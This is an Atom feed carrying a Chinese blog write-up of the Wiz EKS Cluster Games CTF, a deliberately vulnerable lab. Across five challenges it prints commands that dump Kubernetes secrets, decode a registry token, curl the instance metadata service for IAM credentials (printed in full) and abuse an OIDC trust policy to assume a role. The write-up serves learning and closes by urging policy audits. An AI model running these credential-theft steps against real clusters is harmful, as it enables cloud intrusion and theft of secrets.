<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Polo&#39;s Blog</title>
  
  
  <link href="https://polosec.github.io/atom.xml" rel="self"/>
  
  <link href="https://polosec.github.io/"/>
  <updated>2023-12-24T07:30:45.505Z</updated>
  <id>https://polosec.github.io/</id>
  
  <author>
    <name>Polo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>跟WIZ学K8s安全与云安全--CTF挑战赛</title>
    <link href="https://polosec.github.io/2023/12/24/%E4%B8%AA/"/>
    <id>https://polosec.github.io/2023/12/24/%E4%B8%AA/</id>
    <published>2023-12-24T07:30:18.000Z</published>
    <updated>2023-12-24T07:30:45.505Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看WIZ的CTF挑战，做了一下还挺有意思，记录一下在做题时遇到的问题和知识点。</p><p>挑战链接：<a href="https://eksclustergames.com/challenge/">https://eksclustergames.com/challenge/</a></p><p>本次挑战需要的前置知识主要有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.K8S运维命令，如kubectl describe&#x2F;get</span><br><span class="line">2.AWS s3 常用命令</span><br><span class="line">3.AWS s3 CLI 身份配置</span><br><span class="line">4.AWS IAM</span><br><span class="line">5.AWS sts安全凭证管理</span><br></pre></td></tr></table></figure><p>建议先熟悉aws s3基础命令与kubectl 基础命令，然后进行挑战。</p><h2 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h2><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Secret Seeker</span><br><span class="line"></span><br><span class="line">Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</span><br><span class="line"></span><br><span class="line">通过列出集群中的所有秘密来启动您的任务。你能在他们中间认出那面旗帜吗?</span><br></pre></td></tr></table></figure><p>根据题目描述，这题应该是和k8s的secret相关。</p><p>在K8S中，<strong>secret</strong>用来保存小片敏感数据的k8s资源，例如密码，token，或者秘钥。我理解的secret是k8s中的一种资源类型</p><p>本题对当前用户secret资源的权限是get和list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;secrets&quot;: [</span><br><span class="line">        &quot;get&quot;,</span><br><span class="line">        &quot;list&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就可以直接用kubectl去查看</p><p><img src="http://cdn.polowong.top/image-20231224132456810.png" alt="image-20231224132456810"></p><p>使用命令kubectl get secret  secret_name -o json查看secret的具体内容，使用describe命令看不到secret的具体内容，所以这里用get，使用**-o**指定输出格式为json</p><p><img src="http://cdn.polowong.top/image-20231224132647269.png" alt="image-20231224132647269"></p><p>Flag1:wiz_eks_challenge{omg_over_privileged_secret_access}</p><h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Registry Hunt</span><br><span class="line"></span><br><span class="line">A thing we learned during our research: always check the container registries.</span><br><span class="line"></span><br><span class="line">For your convenience, the [crane](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;go-containerregistry&#x2F;blob&#x2F;main&#x2F;cmd&#x2F;crane&#x2F;doc&#x2F;crane.md) utility is already pre-installed on the machine.</span><br><span class="line"></span><br><span class="line">我们在研究过程中学到的一件事是:总是检查容器注册表。为方便起见，[crane](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;go-containerregistry&#x2F;blob&#x2F;main&#x2F;cmd&#x2F;crane&#x2F;doc&#x2F;crane.md)实用程序已经预装在机器上。</span><br></pre></td></tr></table></figure><p>当前用户对k8s资源的权限为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;secrets&quot;: [</span><br><span class="line">        &quot;get&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;pods&quot;: [</span><br><span class="line">        &quot;list&quot;,</span><br><span class="line">        &quot;get&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以get secret，list get pod</p><p>先看一下secrets和pods里面有什么</p><p>secret没有list权限，看下hint，hint2是Reading about ImagePullSecrets might be useful ，提示找ImagePullSecrets。</p><p>经过搜索发现，ImagePullSecrets在image的配置中</p><p><img src="http://cdn.polowong.top/image-20231224133600445.png" alt="image-20231224133600445"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pod database-pod-2c9b3a4e -o json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">    &quot;kind&quot;: &quot;Pod&quot;,</span><br><span class="line">    &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">            &quot;kubernetes.io&#x2F;psp&quot;: &quot;eks.privileged&quot;,</span><br><span class="line">            &quot;pulumi.com&#x2F;autonamed&quot;: &quot;true&quot;</span><br><span class="line">...</span><br><span class="line">                &quot;imageID&quot;: &quot;docker.io&#x2F;eksclustergames&#x2F;base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623&quot;,</span><br><span class="line">                ....</span><br><span class="line">        &quot;imagePullSecrets&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;name&quot;: &quot;registry-pull-secrets-780bab1d&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>现在已经拿到了ImagePullSecrets，hint1是Try obtaining the container registry credentials to pull container images and examine them for sensitive secrets.提示我们可能有机密文件藏在容器镜像里面，那么我们接下来需要做的就是获取容器镜像。</p><p>在我本机直接docker pull试试，提示没有权限</p><p><img src="http://cdn.polowong.top/image-20231224134013637.png" alt="image-20231224134013637"></p><p>那么考虑这是一个私有的docker镜像仓库，需要login进去。</p><p>目前我们已经有imagePullSecrets，通过<strong>kubectl get secrets registry-pull-secrets-780bab1d -o json</strong>命令可以查看这个secrets</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets registry-pull-secrets-780bab1d -o json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;.dockerconfigjson&quot;: &quot;eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;kind&quot;: &quot;Secret&quot;,</span><br><span class="line">    &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">            &quot;pulumi.com&#x2F;autonamed&quot;: &quot;true&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;creationTimestamp&quot;: &quot;2023-11-01T13:31:29Z&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;registry-pull-secrets-780bab1d&quot;,</span><br><span class="line">        &quot;namespace&quot;: &quot;challenge2&quot;,</span><br><span class="line">        &quot;resourceVersion&quot;: &quot;897340&quot;,</span><br><span class="line">        &quot;uid&quot;: &quot;1348531e-57ff-42df-b074-d9ecd566e18b&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;type&quot;: &quot;kubernetes.io&#x2F;dockerconfigjson&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解base64 可以看到docker登录信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;auths&quot;: &#123;&quot;index.docker.io&#x2F;v1&#x2F;&quot;: &#123;&quot;auth&quot;: &quot;ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw&#x3D;&#x3D;&quot;&#125;&#125;&#125;</span><br><span class="line">再解一次 </span><br><span class="line">eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</span><br></pre></td></tr></table></figure><p>然后 docker login</p><p><img src="http://cdn.polowong.top/image-20231224134639022.png" alt="image-20231224134639022"></p><p>到这里就是docker登录成功了，重复刚才pull的操作，可以看到pull是没问题的</p><p><img src="http://cdn.polowong.top/image-20231224134706711.png" alt="image-20231224134706711"></p><p>然后查看一下image的历史记录</p><p><img src="http://cdn.polowong.top/image-20231224134809165.png" alt="image-20231224134809165"></p><p>找到flag2 <strong>wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}</strong></p><h2 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h2><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Image Inquisition</span><br><span class="line">A pod&#39;s image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.</span><br><span class="line"></span><br><span class="line">Remember: You are running inside a compromised EKS pod.</span><br><span class="line"></span><br><span class="line">For your convenience, the crane utility is already pre-installed on the machine.</span><br></pre></td></tr></table></figure><p>EKS 是 AWS 提供的托管 K8S 集群，<strong>Amazon Elastic Container Registry</strong> (ECR) 是一种完全托管的 Docker 容器注册表，开发人员可使用它轻松存储、管理和部署 Docker 容器镜像。</p><p>当前的权限只有get/list pods，先看一下pods里面有什么</p><p>kubectl get pods -o json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;imageID&quot;: &quot;688655246681.dkr.ecr.us-west-1.amazonaws.com&#x2F;central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01&quot;,</span><br></pre></td></tr></table></figure><p>当然，直接pull也不行。</p><p>题目给出了当前是在AWS的EKS中，我们的目的是从EKS横向到AWS中。</p><p>通过在EKS中访问169.254.169.254/latest/meta-data可以获取一些信息</p><p>通过访问<strong>169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole</strong>可以获取IAM相关的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s 169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;iam&#x2F;security-credentials&#x2F;eks-challenge-cluster-nodegroup-NodeInstanceRole</span><br><span class="line">&#123;&quot;AccessKeyId&quot;:&quot;ASIA2AVYNEVM2TORP3VO&quot;,&quot;Expiration&quot;:&quot;2023-12-24 06:56:25+00:00&quot;,&quot;SecretAccessKey&quot;:&quot;kDLFtTHNjzPec5X71YL3BzeUvDzWyJxPuws7qQjf&quot;,&quot;SessionToken&quot;:&quot;FwoGZXIvYXdzEN&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;wEaDOfArbgAczkmiTYjGCK3AVUnVd1OaYk56+8XRY9NBwfNpcEMr3nEzeV&#x2F;&#x2F;1Ln1qF9AL2c+dFO9iZKDaj8sVy7nx&#x2F;2CKbb9uxEO0cSJpAUB2blFauosGC4IrTcF1u9oqT2px&#x2F;i0+EtLqbj+tW4CMezwIzWLe1yFVURFRuwET3hQFWJnFVmOvJ9JtfNpqV5TjSt2vzK8HuDFREDzP7tj6yy57iKNJRwvpA1TKql0RXRhyotE8ADkvYxkZHwNBM4wcJUXcWgXJA0USiJkJ+sBjIttqoyUlIC7cLuqzE8SZc9VzQc6TTwriI1Xuz7nAa0qRGjNcsJqepxgARs0CIe&quot;&#125;</span><br></pre></td></tr></table></figure><p>到这儿就非常简单了，直接给了AK SK session key</p><p>在终端里面执行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_SECRET_ACCESS_KEY&#x3D;kDLFtTHNjzPec5X71YL3BzeUvDzWyJxPuws7qQjf</span><br><span class="line">export AWS_ACCESS_KEY_ID&#x3D;ASIA2AVYNEVM2TORP3VO</span><br><span class="line">export AWS_SESSION_TOKEN&#x3D;FwoGZXIvYXdzEN&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;wEaDOfArbgAczkmiTYjGCK3AVUnVd1OaYk56+8XRY9NBwfNpcEMr3nEzeV&#x2F;&#x2F;1Ln1qF9AL2c+dFO9iZKDaj8sVy7nx&#x2F;2CKbb9uxEO0cSJpAUB2blFauosGC4IrTcF1u9oqT2px&#x2F;i0+EtLqbj+tW4CMezwIzWLe1yFVURFRuwET3hQFWJnFVmOvJ9JtfNpqV5TjSt2vzK8HuDFREDzP7tj6yy57iKNJRwvpA1TKql0RXRhyotE8ADkvYxkZHwNBM4wcJUXcWgXJA0USiJkJ+sBjIttqoyUlIC7cLuqzE8SZc9VzQc6TTwriI1Xuz7nAa0qRGjNcsJqepxgARs0CIe</span><br></pre></td></tr></table></figure><p>执行之后可以env看一下有没有写入</p><p><img src="http://cdn.polowong.top/image-20231224135956677.png" alt="image-20231224135956677"></p><p>执行命令<strong>aws sts get-caller-identity</strong> 查看当前权限（aws sts用于创建可控制对您的 Amazon 资源的访问的临时安全凭证，并将这些凭证提供给受信任用户，总而言之和身份认证相关）</p><p><img src="http://cdn.polowong.top/image-20231224140044059.png" alt="image-20231224140044059"></p><p>我们的目的是登录docker pull image，由于已经接管了aws权限，所以可以接管ecr生成登录密码</p><p><strong>aws ecr get-login-password –region us-west-1</strong>（这个region是我通过读取<strong>kubectl get pods -o json</strong>命令结果看到的）</p><p>这里面必须指定region，否则密码不对，后面登录不上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXl....M1fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>接下来用这个密码登录docker就ok，这里使用crane登录</p><p><strong>aws ecr get-login-password | crane auth login –username AWS –password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com</strong></p><p><img src="http://cdn.polowong.top/image-20231224140630965.png" alt="image-20231224140630965"></p><p>查看image的config</p><p><strong>crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;architecture&quot;:&quot;amd64&quot;,&quot;config&quot;:&#123;&quot;Env&quot;:[&quot;PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;],&quot;Cmd&quot;:[&quot;&#x2F;bin&#x2F;sleep&quot;,&quot;3133337&quot;],&quot;ArgsEscaped&quot;:true,&quot;OnBuild&quot;:null&#125;,&quot;created&quot;:&quot;2023-11-...</span><br><span class="line">ARTIFACTORY_TOKEN&#x3D;wiz_eks_challenge&#123;the_history_of_container_images_could_reveal_the_secrets_to_the_future&#125; ARTIFACTORY_REPO&#x3D;base_repo &#x2F;bin&#x2F;sh -c pip install setuptools --index-url intrepo.eksclustergames.com # ...                             </span><br></pre></td></tr></table></figure><p>找到flag</p><p> <strong>wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future}</strong></p><h2 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h2><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pod Break</span><br><span class="line">You&#39;re inside a vulnerable pod on an EKS cluster. Your pod&#39;s service-account has no permissions. Can you navigate your way to access the EKS Node&#39;s privileged service-account?</span><br></pre></td></tr></table></figure><p>看题目描述有点像传统渗透中的提权，先看下permission。。竟然什么都没有</p><p>这就有点难办了，直接搜eks提权肯定搜不到东西</p><p>当前在aws中，使用eks看下</p><p><strong>aws eks list-clusters</strong> 没有权限</p><p>看一下其他命令</p><p><strong>aws eks get-token</strong>需要 cluster-name或者cluster-id，但是这两个都没有</p><p>目前需要找的是cluster-name或者cluster-id，题目hint <strong>The convention for the IAM role of a node follows the pattern: [cluster-name]-nodegroup-NodeInstanceRole.</strong></p><p>这不巧了吗，aws sts get-caller-identity可以看到一串</p><p>arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282</p><p>那么就可以得到cluster-name就是eks-challenge-cluster，接下来就可以愉快的get-token</p><p><strong>aws eks get-token –cluster-name eks-challenge-cluster</strong></p><p><img src="http://cdn.polowong.top/image-20231224142258171.png" alt="image-20231224142258171"></p><p>那么使用这个token就可以去操作kubectl</p><p><img src="http://cdn.polowong.top/image-20231224142903732.png" alt="image-20231224142903732"></p><p><strong>kubectl get secret node-flag -o json –token k8s-a</strong></p><p>得到flag</p><p>d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=</p><p><strong>wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}</strong></p><h2 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h2><p>题目描述</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Container</span> <span class="string">Secrets</span> <span class="string">Infrastructure</span></span><br><span class="line"><span class="string">You&#x27;ve</span> <span class="string">successfully</span> <span class="string">transitioned</span> <span class="string">from</span> <span class="string">a</span> <span class="string">limited</span> <span class="string">Service</span> <span class="string">Account</span> <span class="string">to</span> <span class="string">a</span> <span class="string">Node</span> <span class="string">Service</span> <span class="string">Account!</span> <span class="string">Great</span> <span class="string">job.</span> <span class="string">Your</span> <span class="string">next</span> <span class="string">challenge</span> <span class="string">is</span> <span class="string">to</span> <span class="string">move</span> <span class="string">from</span> <span class="string">the</span> <span class="string">EKS</span> <span class="string">to</span> <span class="string">the</span> <span class="string">AWS</span> <span class="string">account.</span> <span class="string">Can</span> <span class="string">you</span> <span class="string">acquire</span> <span class="string">the</span> <span class="string">AWS</span> <span class="string">role</span> <span class="string">of</span> <span class="string">the</span> <span class="string">s3access-sa</span> <span class="string">service</span> <span class="string">account,</span> <span class="string">and</span> <span class="string">get</span> <span class="string">the</span> <span class="string">flag?</span></span><br><span class="line"></span><br><span class="line"><span class="string">IAM：</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;Policy&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;Statement&quot;:</span> [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;Action&quot;:</span> [</span><br><span class="line">                    <span class="string">&quot;s3:GetObject&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">&quot;Effect&quot;:</span> <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;Resource&quot;:</span> [</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;Version&quot;:</span> <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">Trust</span> <span class="string">policy：</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;Version&quot;:</span> <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Statement&quot;:</span> [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;Effect&quot;:</span> <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;Principal&quot;:</span> &#123;</span><br><span class="line">                <span class="attr">&quot;Federated&quot;:</span> <span class="string">&quot;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;Action&quot;:</span> <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;Condition&quot;:</span> &#123;</span><br><span class="line">                <span class="attr">&quot;StringEquals&quot;:</span> &#123;</span><br><span class="line">                    <span class="attr">&quot;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&quot;:</span> <span class="string">&quot;sts.amazonaws.com&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">权限：</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;secrets&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;serviceaccounts&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;pods&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;serviceaccounts/token&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;create&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据题目描述，这题大概的考点是从EKS横向到AWS，最终读取S3 bucket中的flag</p><p>对于第一个IAM的配置，告诉了我们flag的位置</p><p>对于第二个 trust policy的配置，允许AssumeRoleWithWebIdentity操作的OIDC audience字段必须为<strong>sts.amazonaws.com</strong></p><p>对于第三个权限配置，允许get/list secrets、sa、pods、以及创建sa的token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service account(sa)，顾名思义，主要是给service使用的一个账号。</span><br><span class="line">具体一点，就是为了让Pod中的进程、服务能访问k8s集群而提出的一个概念，基于service account，pod中的进程、服务能获取到一个username和令牌Token，从而调用kubernetes集群的api server。</span><br></pre></td></tr></table></figure><p>先在kubectl看一下有什么sa</p><p><img src="http://cdn.polowong.top/image-20231224143947159.png" alt="image-20231224143947159"></p><p>Kubectl create token s3access-sa 创建token没有权限，只能创建debug-sa的token</p><p>这题的考点在信任策略(TP)中，”在Kubernetes的TokenRequest API中，sub（subject）字段通常被用来表示令牌的主体，也就是令牌的所有者。这通常是一个服务账户。如果IAM信任策略没有对sub字段进行检查，那么任何能够生成有效OIDC令牌的服务账户都可以扮演这个IAM角色。”</p><p>那么我们可以生成一个debug-sa的token，指定audience为<strong>sts.amazonaws.com</strong></p><p><strong>kubectl create token debug-sa –audience sts.amazonaws.com</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhb..LUoBbGdG5PIg2JumEx0I2V2GvIAHuIUM-IZ1dsYkVJSRfqR8JQCf-NQqJIEg</span><br></pre></td></tr></table></figure><p>使用这个token，通过<strong>sts</strong>调用<strong>AssumeRoleWithWebIdentity</strong>方法，可以获得一个临时的身份认证凭据</p><p><strong>aws sts  assume-role-with-web-identity –role-arn xxx –role-session-name foobar –web-identity-token eyJ…</strong></p><p>其中，这个arn是s3access-sa的arn，通过命令 <strong>kubectl get  sa s3access-sa -o json</strong>  获得：<strong>arn:aws:iam::688655246681:role/challengeEksS3Role</strong></p><p>那么最终的命令就是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts  assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role  --role-session-name foobar --web-identity-token eyJhb..qJIEg</span><br></pre></td></tr></table></figure><p>ok，拿到三件套</p><p><img src="http://cdn.polowong.top/image-20231224144951158.png" alt="image-20231224144951158"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_SECRET_ACCESS_KEY&#x3D;guhNvCvXpCFMAIBauigUeDcy06a2hNwM&#x2F;CNliEWd</span><br><span class="line">export AWS_ACCESS_KEY_ID&#x3D;ASIA2AVYNEVM7VVFVCGV</span><br><span class="line">export AWS_SESSION_TOKEN&#x3D;IQoJb3Jp..pw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20231224145054792.png" alt="image-20231224145054792"></p><p>根据第一个IAM policy给的地址challenge-flag-bucket-3ff1ae2，找到flag</p><p><img src="http://cdn.polowong.top/image-20231224145130399.png" alt="image-20231224145130399"></p><p><strong>wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>考察点比较基础，重在掌握aws、k8s基本的运维与操作命令。</p><p>同时aws身份认证、策略也是容易出问题的点（misconfiguration），要学会审计策略。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2371571">https://cloud.tencent.com/developer/article/2371571</a></p><p><a href="https://developer.aliyun.com/article/1398162">https://developer.aliyun.com/article/1398162</a></p><p><a href="https://cloud.tencent.com/developer/article/2371571">https://cloud.tencent.com/developer/article/2371571</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在看WIZ的CTF挑战，做了一下还挺有意思，记录一下在做题时遇到的问题和知识点。&lt;/p&gt;
